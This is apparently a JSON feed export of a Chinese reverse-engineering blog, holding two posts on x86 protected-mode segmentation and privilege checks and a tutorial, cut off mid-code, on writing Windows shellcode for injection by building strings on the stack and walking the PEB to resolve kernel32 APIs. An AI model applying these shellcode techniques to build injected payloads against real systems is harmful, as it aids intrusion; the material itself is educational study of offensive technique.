{
    "version": "https://jsonfeed.org/version/1",
    "title": "Be malicious",
    "subtitle": "Till I no longer can",
    "icon": "https://self-ferry.github.io/images/favicon.ico",
    "description": "临渊羡鱼，不如退而结网",
    "home_page_url": "https://Self-ferry.github.io",
    "items": [
        {
            "id": "https://self-ferry.github.io/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-%E6%AE%B5%E6%9D%83%E9%99%90%E6%A3%80%E6%B5%8B/",
            "url": "https://self-ferry.github.io/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-%E6%AE%B5%E6%9D%83%E9%99%90%E6%A3%80%E6%B5%8B/",
            "title": "保护模式--段权限检测",
            "date_published": "2021-07-29T14:22:31.000Z",
            "content_html": "<h1 id=\"段权限检测\"><a class=\"anchor\" href=\"#段权限检测\">#</a> 段权限检测</h1>\n<h2 id=\"cpu权限等级划分\"><a class=\"anchor\" href=\"#cpu权限等级划分\">#</a> CPU 权限等级划分</h2>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>CPU 一共四个等级. ring3 - ring 0 而操作系统只使用了 ring3 与 ring0 所以 ring3 就是应用程序，ring0 就是内核程序。<br />\n应用程序不可以执行特权指令，内核程序可以执行特权指令。</p>\n<h1 id=\"cpl-rpl-dpl-介绍\"><a class=\"anchor\" href=\"#cpl-rpl-dpl-介绍\">#</a> CPL RPL DPL 介绍</h1>\n<p>描述符特权级 (DPL) 域 ——(段描述符的第二个双字的 bit 13 和 bit 14) 确定该段的特权级。<br />\n请求特权级 (RPL) 域 ——(段选择符的 bit 0 和 bit 1) 确定一个段选择符的请求特权级。<br />\n当前特权级 (CPL) 域 ——(CS 段寄存器的 bit 0 和 bit 1) 指明当前运行的进程的特权级。术语当前特权级 (CPL) 就是指该域的设置。</p>\n<ul>\n<li><strong>当前特权级（CPL）</strong></li>\n</ul>\n<p>描述：</p>\n<p>段寄存器 CS 的后两位比特位称为当前特权级<br />\n注意：段选择子 SS 和 CS 的后两位比特位相同</p>\n<p><em>如：</em></p>\n<pre><code>→ CS = 0x001B\n→ 0x001B = 二进制:0000 0000 0001 1011\n→ 二进制:11 = 十进制:3\n→ 因此：当前进程处于3环\n</code></pre>\n<ul>\n<li><strong>请求特权级（RPL）</strong></li>\n</ul>\n<p>描述：</p>\n<p>RPL 是段选择子结构中的一部分<br />\n RPL 是针对段选择子而言的，每个段的选择子都有自己的 RPL<br />\nRPL 表示用什么权限去访问一个段</p>\n<p><em>例：</em></p>\n<pre><code>MOV AX,0008\nMOV DS,AX\n与\nMOV AX,000B\nMOV DS,AX\n指向的是同一个段描述符，但RPL不同\n</code></pre>\n<ul>\n<li><strong>3）数据段的权限检查</strong></li>\n</ul>\n<p>检查：CPL&lt;= DPL 并且 RPL&lt;= DPL（数值上的比较）</p>\n<p><em>例：</em></p>\n<pre><code>当CPL = 0时执行以下指令：\n  MOV AX,000B\t\t\t// RPL=3，请求权限为3\n  MOV DS,AX\t\t\t// 假设ax指向的段描述符的DPL=0\n上述指令虽然满足了CPL&lt;=DPL，但RPL&gt;DPL，因此执行失败\n</code></pre>\n<p>注意：代码段和系统端描述符的检查方式不一样</p>\n<p><strong>既然已经有 CPL（当前特权级别）了，为什么还要有 RPL（请求特权级别）呢？<br />\n原因：我们本可以用 “读写” 的权限去打开一个文件，但为了避免出错，有些时候我们使用 “只读” 的权限去打开</strong></p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTg4NDQ4L2FydGljbGUvZGV0YWlscy8xMDI1NjMzMjU=\">https://blog.csdn.net/qq_41988448/article/details/102563325</span></p>\n",
            "tags": [
                "保护模式",
                "CRL",
                "DPL",
                "RPL"
            ]
        },
        {
            "id": "https://self-ferry.github.io/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8%E7%BB%93%E6%9E%84%E3%80%81%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E6%AE%B5%E9%80%89%E6%8B%A9%E5%AD%90/",
            "url": "https://self-ferry.github.io/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8%E7%BB%93%E6%9E%84%E3%80%81%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E6%AE%B5%E9%80%89%E6%8B%A9%E5%AD%90/",
            "title": "保护模式--段寄存器结构、段描述符、段选择子",
            "date_published": "2021-07-29T13:25:00.000Z",
            "content_html": "<h1 id=\"段寄存器\"><a class=\"anchor\" href=\"#段寄存器\">#</a> 段寄存器</h1>\n<p>什么是段寄存器，有哪些段寄存器</p>\n<p>当我们用汇编读写某一个地址时： <code>mov dword ptr ds:[0x123456],eax</code> <br />\n 我们真正读写的地址是： <code>ds.base + 0x123456</code> <br />\n <code>ES</code>   <code>CS</code>   <code>SS</code>   <code>DS</code>   <code>FS</code>   <code>GS</code>   <code>LDTR</code>   <code>TR</code>  共 8 个</p>\n<h2 id=\"段寄存器结构\"><a class=\"anchor\" href=\"#段寄存器结构\">#</a> 段寄存器结构</h2>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>段寄存器中有 16 位是可见部分，有 80 位是不可见部分，一共 96 位。<br />\n可见部分为 16 位的 Selector 部分<br />\n 16 位的 Attribute 为这个段寄存器的属性，它的意义为：表示该段寄存器是可读还是可写还是可执行的。<br />\n32 位的 Base 表示该段是从哪里开始的。<br />\n32 位的 Limit 表示整个段的长度有多少。</p>\n<h2 id=\"段寄存器的读写\"><a class=\"anchor\" href=\"#段寄存器的读写\">#</a> 段寄存器的读写</h2>\n<p>读段寄存器的时候只能够读 16 位。<br />\n比如： <code>mov ax,es</code>  只能读 16 位的可见部分</p>\n<p>读写 LDTR 的指令为： <code>SLDT/LLDT</code></p>\n<p>读写 TR 的指令为： <code>STR/LTR</code></p>\n<p>写段寄存器的时候写的是 96 位。<br />\n比如： <code>mov ds,ax</code>  写时是写 96 位</p>\n<h2 id=\"段寄存器属性简介\"><a class=\"anchor\" href=\"#段寄存器属性简介\">#</a> 段寄存器属性简介</h2>\n<table>\n<thead>\n<tr>\n<th>段寄存器</th>\n<th>Selector</th>\n<th>Attribute</th>\n<th>Base</th>\n<th>Limit</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ES (附加扩展段)</td>\n<td>0023</td>\n<td>可读、可写</td>\n<td>0</td>\n<td>0xFFFFFFFF</td>\n</tr>\n<tr>\n<td>CS (代码段)</td>\n<td>001B</td>\n<td>可读、可执行</td>\n<td>0</td>\n<td>0xFFFFFFFF</td>\n</tr>\n<tr>\n<td>SS (堆栈段)</td>\n<td>0023</td>\n<td>可读、可写</td>\n<td>0</td>\n<td>0xFFFFFFFF</td>\n</tr>\n<tr>\n<td>DS (数据段)</td>\n<td>0023</td>\n<td>可读、可写</td>\n<td>0</td>\n<td>0xFFFFFFFF</td>\n</tr>\n<tr>\n<td>FS (分段机制)</td>\n<td>003B</td>\n<td>可读、可写</td>\n<td>0x7FFDE000</td>\n<td>0xFFF</td>\n</tr>\n<tr>\n<td>GS</td>\n<td>-</td>\n<td>-</td>\n<td>-</td>\n<td>-</td>\n</tr>\n</tbody>\n</table>\n<p>GS 寄存器 Windows 并没有使用。</p>\n<h2 id=\"gdt全局描述符表-ldt局部描述符表\"><a class=\"anchor\" href=\"#gdt全局描述符表-ldt局部描述符表\">#</a> GDT (全局描述符表) LDT (局部描述符表)</h2>\n<p><strong>LDT 表在 Windows 中并没有使用。</strong><br />\n当我们执行类似  <code>mov ds,ax</code>  指令时，CPU 会查表，根据  <code>ax</code>  的值来决定查找  <code>GDT</code>  还是  <code>LDT</code> , 查找表的什么位置，查出多少数据。<br />\n <code>gdtr</code>  寄存器中存储了  <code>GDT</code>  表的起始地址和  <code>gdt</code>  表中的长度<br />\n gdtr 是 48 位的寄存器，其中 32 位存储的这张表的位置，16 位存储的这张表的大小。</p>\n<p><strong>在 windbg 中查看</strong></p>\n<pre><code>r gdtr //gdt表的存储位置\nr gdtl //gdt表的大小\n</code></pre>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>每次从  <code>GDT</code>  表中查表：每 8 个字节为一个<strong>段描述符</strong>。</p>\n<h1 id=\"段选择子\"><a class=\"anchor\" href=\"#段选择子\">#</a> 段选择子</h1>\n<p>段选择子是一个 16 位的段描述符，该描述符指向了定义该段的段描述符.</p>\n<h2 id=\"段选择子和段寄存器的对应关系\"><a class=\"anchor\" href=\"#段选择子和段寄存器的对应关系\">#</a> 段选择子和段寄存器的对应关系</h2>\n<p>对应可见部分的 16 位既段寄存器中的 Selector。</p>\n<h2 id=\"段选择子的结构\"><a class=\"anchor\" href=\"#段选择子的结构\">#</a> 段选择子的结构</h2>\n<p><img data-src=\"image009.png\" alt=\"\" /></p>\n<p>RPL：请求特权级别<br />\n TI：TI=0 查 GDT 表；TI=1 查 LDT 表<br />\n Index：处理器将索引值乘以 8 在加上 GDT 或者 LDT 的基地址，就是要加载的段描述符</p>\n<h1 id=\"段描述符\"><a class=\"anchor\" href=\"#段描述符\">#</a> 段描述符</h1>\n<h2 id=\"段描述符的结构\"><a class=\"anchor\" href=\"#段描述符的结构\">#</a> 段描述符的结构</h2>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<ol>\n<li>\n<p>16 位的 Attribute 对应段寄存器中高四字节从 8 位开始到第 23 位结束。</p>\n</li>\n<li>\n<p>32 位的 Base 包含了三个部分：</p>\n<ul>\n<li>高四字节的第 24 位到第 31 部分</li>\n<li>高四字节的第 0 位到第 7 位</li>\n<li>低四字节的第 16 位到 31 位</li>\n</ul>\n</li>\n<li>\n<p>32 位的 Limit 包括两部分一共二十位（最大值为 FFFFF）：</p>\n<ul>\n<li>高四字节的 16 位到 19 位</li>\n<li>低四个字节的 0 位到 15 位</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"段描述符的属性\"><a class=\"anchor\" href=\"#段描述符的属性\">#</a> 段描述符的属性</h2>\n<p>段寄存器的值是通过段描述符填写的，但段描述符只有 64 位，可是要填写的有 80 位，如何从 64 位变成 80 位呢？</p>\n<h3 id=\"p位\"><a class=\"anchor\" href=\"#p位\">#</a> P 位</h3>\n<p>P 位 位于段描述符的高四个字节的第 15 位（下标为 15）的位置.</p>\n<p>P = 1 段描述符有效<br />\n P = 0 段描述符无效</p>\n<p>当使用指令将段描述符加载至段寄存器的时候，CPU 第一个检测的就是 P 位，当 P 位为 0 时就不做继续的检测了。</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>在段描述符中，只要看这一行的数是否小于 8，若小于 8，则证明 P 位 = 0 段描述符无效。</p>\n<h3 id=\"g位\"><a class=\"anchor\" href=\"#g位\">#</a> G 位</h3>\n<p>G 位 位于段描述符的高四个字节的第 23 位（下标为 23）的位置。</p>\n<p>G=0 的时候：表示 Limit 字段单位是字节：最大值是 0x000FFFFF。<br />\nG=1 的时候：表示 Limit 字段单位是 4KB：最大值是 0xFFFFFFFF。</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>在段描述符中，只要看这一行的数是否小于 8，若小于 8，则证明 G 位 = 0。</p>\n<h3 id=\"s位\"><a class=\"anchor\" href=\"#s位\">#</a> S 位</h3>\n<p>S 位 位于段描述符的高四个字节的第 12 位（下标为 12）的位置。</p>\n<p>S = 1 时表示： 代码段或者数据段描述符<br />\n S = 0 时表示： 系统段描述符</p>\n<ul>\n<li><strong>十六进制下，从右到左看高字节的第五位，若是偶数则 S 位 = 0，若是奇数则 S 位 = 1。</strong></li>\n</ul>\n<h3 id=\"type域\"><a class=\"anchor\" href=\"#type域\">#</a> type 域</h3>\n<p>type 域 包含段描述符的高四个字节的 8、9、10、11 共四位。</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<h4 id=\"数据段\"><a class=\"anchor\" href=\"#数据段\">#</a> 数据段</h4>\n<p>当 s 位为 1 且当 type 域中的 11 位为 0 时，表示是数据段。<br />\n其中图中的 A、W、E 分别代表不同的意思</p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<p>E 位表示拓展位，为 0 表示向上拓展，为 1 表示向下拓展。<br />\n向上拓展：有效范围为 <code>fs.Base ~ fs.Base+Limit</code> <br />\n 向下拓展：有效范围除了 <code>fs.Base ~ fs.Base+Limit</code></p>\n<h4 id=\"代码段\"><a class=\"anchor\" href=\"#代码段\">#</a> 代码段</h4>\n<p>当 s 位为 1 且当 type 域中的 11 位为 1 时，表示是代码段。<br />\n其中图中的 A、R、C 分别代表不同的意思</p>\n<p>A 代表是否访问过，未访问过为 0，访问过为 1。<br />\nR 代表是否可读位，表示该段是否可以读。<br />\nC 代表一致位：C = 1 表示一致代码段 ，C = 0 表示非一致代码段</p>\n<h4 id=\"系统描述符\"><a class=\"anchor\" href=\"#系统描述符\">#</a> 系统描述符</h4>\n<p>当 s 位为 0 的时候，表示该段描述符为系统描述符。系统描述符有分为以下类型：</p>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<h3 id=\"dpl\"><a class=\"anchor\" href=\"#dpl\">#</a> DPL</h3>\n<ul>\n<li><strong>描述：</strong></li>\n</ul>\n<p>DPL 存储在段描述符中，规定了访问所在段描述符所需要的特权级别是多少<br />\n DPL 数值越大，访问所在段描述符所需要的权限越低<br />\n注意：在 Windows 中，DPL 只会出现两种情况，要么全为 0，要么全为 1</p>\n<p><strong>十六进制下，从右到左看高字节的第五位，若是 <code>8</code>  或 <code>9</code>  则 DPL=0，若是 <code>E</code>  或 <code>F</code>  则 DPL=3。</strong></p>\n<ul>\n<li><strong>例：</strong></li>\n</ul>\n<p>若 AX 指向的段描述符的 DPL=0，但当前程序的 CPL=3，那么这条指令是不会成功的！</p>\n<h3 id=\"db位\"><a class=\"anchor\" href=\"#db位\">#</a> D\\B 位</h3>\n<p><strong>情况 1：对 CS 段的影响</strong></p>\n<p>D=1：采用 32 位寻址方式<br />\n D=0：采用 16 位寻址方式</p>\n<p><strong>情况 2：对 SS 段的影响</strong></p>\n<p>D=1：隐式堆栈访问指令（如：PUSH POP CALL）使用 32 位堆栈指针寄存器 ESP<br />\nD=0：隐式堆栈访问指令（如：PUSH POP CALL）使用 16 位堆栈指针寄存器 SP</p>\n<p><strong>情况 3：向下拓展的数据段</strong></p>\n<p>D=1：段上限为 4GB<br />\nD=0：段上限为 64KB</p>\n<p><img data-src=\"image010.png\" alt=\"\" /></p>\n<h2 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2OTE2MTc5L2FydGljbGUvZGV0YWlscy85MTU1MDYzMQ==\">https://blog.csdn.net/qq_36916179/article/details/91550631</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2OTE2MTc5L2FydGljbGUvZGV0YWlscy85MTYyMTk0Nw==\">https://blog.csdn.net/qq_36916179/article/details/91621947</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTg4NDQ4L2FydGljbGUvZGV0YWlscy8xMDI1NjMzMjU=\">https://blog.csdn.net/qq_41988448/article/details/102563325</span></p>\n",
            "tags": [
                "保护模式",
                "段寄存器结构",
                "段描述符",
                "段选择子",
                "GDT表"
            ]
        },
        {
            "id": "https://self-ferry.github.io/Win%E6%B3%A8%E5%85%A5ShellCode/",
            "url": "https://self-ferry.github.io/Win%E6%B3%A8%E5%85%A5ShellCode/",
            "title": "Win注入ShellCode",
            "date_published": "2021-07-20T13:02:23.000Z",
            "content_html": "<h1 id=\"shellcode\"><a class=\"anchor\" href=\"#shellcode\">#</a> ShellCode</h1>\n<h2 id=\"什么是shellcode\"><a class=\"anchor\" href=\"#什么是shellcode\">#</a> 什么是 ShellCode</h2>\n<p>其实在注入代码中就已经用到了。</p>\n<p>ShellCode 就是一段不依赖环境，放到任何地方都可以执行的机器码。</p>\n<h2 id=\"shellcode编写原则\"><a class=\"anchor\" href=\"#shellcode编写原则\">#</a> ShellCode 编写原则</h2>\n<ol>\n<li>\n<p>不能有全局变量</p>\n</li>\n<li>\n<p>不能使用常量字符串</p>\n</li>\n<li>\n<p>不能使用系统调用</p>\n</li>\n<li>\n<p>不能嵌套调用其他函数</p>\n</li>\n</ol>\n<p>如果按照这个规则写出的代码，那么代码的硬编码放到那里都能执行。</p>\n<h2 id=\"shellcode编写\"><a class=\"anchor\" href=\"#shellcode编写\">#</a> ShellCode 编写</h2>\n<p>要编写 ShellCode 就要想办法绕过 ShellCode 原则。</p>\n<h3 id=\"写代码可以不用全局变量这个不是问题\"><a class=\"anchor\" href=\"#写代码可以不用全局变量这个不是问题\">#</a> 写代码可以不用全局变量，这个不是问题。</h3>\n<h3 id=\"不使用常量字符串\"><a class=\"anchor\" href=\"#不使用常量字符串\">#</a> 不使用常量字符串。</h3>\n<p>字符串的写法，示例：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">000</span>C433B A1 <span class=\"token number\">30</span> <span class=\"token number\">7</span>B <span class=\"token number\">0</span>C <span class=\"token number\">00</span>       mov         eax<span class=\"token punctuation\">,</span>dword ptr ds<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">000</span>C7B30h<span class=\"token punctuation\">]</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">000</span>C4340 <span class=\"token number\">89</span> <span class=\"token number\">45</span> F4             mov         dword ptr <span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">-</span><span class=\"token number\">0</span>Ch<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>eax  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">000</span>C4343 <span class=\"token number\">66</span> <span class=\"token number\">8</span>B <span class=\"token number\">0</span>D <span class=\"token number\">34</span> <span class=\"token number\">7</span>B <span class=\"token number\">0</span>C <span class=\"token number\">00</span> mov         cx<span class=\"token punctuation\">,</span>word ptr ds<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">000</span>C7B34h<span class=\"token punctuation\">]</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">000</span>C434A <span class=\"token number\">66</span> <span class=\"token number\">89</span> <span class=\"token number\">4</span>D F8          mov         word ptr <span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>cx  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">char</span> l<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"hello\"</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">000</span>C434E A1 <span class=\"token number\">30</span> <span class=\"token number\">7</span>B <span class=\"token number\">0</span>C <span class=\"token number\">00</span>       mov         eax<span class=\"token punctuation\">,</span>dword ptr ds<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">000</span>C7B30h<span class=\"token punctuation\">]</span>  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">000</span>C4353 <span class=\"token number\">89</span> <span class=\"token number\">45</span> E4             mov         dword ptr <span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">-</span><span class=\"token number\">1</span>Ch<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>eax  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">000</span>C4356 <span class=\"token number\">66</span> <span class=\"token number\">8</span>B <span class=\"token number\">0</span>D <span class=\"token number\">34</span> <span class=\"token number\">7</span>B <span class=\"token number\">0</span>C <span class=\"token number\">00</span> mov         cx<span class=\"token punctuation\">,</span>word ptr ds<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">000</span>C7B34h<span class=\"token punctuation\">]</span>  </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token number\">000</span>C435D <span class=\"token number\">66</span> <span class=\"token number\">89</span> <span class=\"token number\">4</span>D E8          mov         word ptr <span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">-</span><span class=\"token number\">18</span>h<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>cx  </pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">char</span> p<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">'h'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'o'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\0'</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 注意字符串以 0x0 结尾</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token number\">000</span>C4361 C6 <span class=\"token number\">45</span> D4 <span class=\"token number\">68</span>          mov         byte ptr <span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">-</span><span class=\"token number\">2</span>Ch<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">68</span>h  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token number\">000</span>C4365 C6 <span class=\"token number\">45</span> D5 <span class=\"token number\">65</span>          mov         byte ptr <span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">-</span><span class=\"token number\">2</span>Bh<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">65</span>h  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token number\">000</span>C4369 C6 <span class=\"token number\">45</span> D6 <span class=\"token number\">6</span>C          mov         byte ptr <span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">-</span><span class=\"token number\">2</span>Ah<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span>Ch  </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token number\">000</span>C436D C6 <span class=\"token number\">45</span> D7 <span class=\"token number\">6</span>C          mov         byte ptr <span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">-</span><span class=\"token number\">29</span>h<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span>Ch  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token number\">000</span>C4371 C6 <span class=\"token number\">45</span> D8 <span class=\"token number\">6F</span>          mov         byte ptr <span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">-</span><span class=\"token number\">28</span>h<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">6F</span>h  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token number\">000</span>C4375 C6 <span class=\"token number\">45</span> D9 <span class=\"token number\">00</span>          mov         byte ptr <span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">-</span><span class=\"token number\">27</span>h<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span></pre></td></tr></table></figure><p>在反汇编中可以看到，只有最后一种是存在堆栈中，不依赖其他，在任何地方都可以用。</p>\n<h3 id=\"调用系统api\"><a class=\"anchor\" href=\"#调用系统api\">#</a> 调用系统 API</h3>\n<p>为什么不能直接写呢？</p>\n<p>因为 API 函数在 dll 文件中，是依赖 PE 的导入表的。</p>\n<p>动态获取所需系统 API 地址；shellcode 的很多操作涉及系统底层，必然调用 windows 的 API。正常情况下，windows 针对 3 环用户态程序提供 LoadLibrary 加载 dll，返回 dll 的基址。然后通过 GetProcAddress 从 dll 种获取函数基址；但这两个函数本身也是 windwos 的 API，其地址依然需要动态获取，该怎么做了？</p>\n<ul>\n<li>动态获取 LoadLibraryW 的地址</li>\n</ul>\n<p>先获得 <code>GetProcAdress</code>  函数地址后就可以获得任意地址了。</p>\n<p>还记得 PEB 吗？</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p><code>HMODULE hModule = LoadLibrary(&quot;user32.dll&quot;)</code>  得到的这个 <code>hModule</code>  的值就是 <code>DllBase</code></p>\n<p>没错就是利用这个。先找 kernel32.dll，找到 dll 后查找其中函数的地址，这要利用 PE 导出表的知识了。</p>\n<p>代码如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">WIN32_LEAN_AND_MEAN</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">//Unicode 结构体，这个结构体是在内核中的，在 3 环我们只能自己定义了</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_LSA_UNICODE_STRING</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tUSHORT Length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tUSHORT MaximumLength<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tPWSTR Buffer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span> UNICODE_STRING<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_PEB_LDR_DATA</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tDWORD\t\tLength<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tBYTE\t\tInitialized<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tVOID<span class=\"token operator\">*</span>\t\tSsHandle<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tLIST_ENTRY\tInloadOrderModuleList<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tLIST_ENTRY\tInMemoryOrderModuleList<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tLIST_ENTRY  InInitializationOrderModuleList<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tVOID<span class=\"token operator\">*</span>\t\tEntryInProgress<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span>PEB_LDR_DATA<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_LDR_DATA_TABLE_ENTRY</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tLIST_ENTRY\t\tInloadOrderModuleList<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tLIST_ENTRY\t\tInMemoryOrderModuleList<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tLIST_ENTRY\t\tInInitializationOrderModuleList<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tVOID<span class=\"token operator\">*</span>\t\t\tDllBase<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\tVOID<span class=\"token operator\">*</span>\t\t\tEntryPoint<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tDWORD\t\t\tSizeOfImage<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tUNICODE_STRING\tFullDllName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td 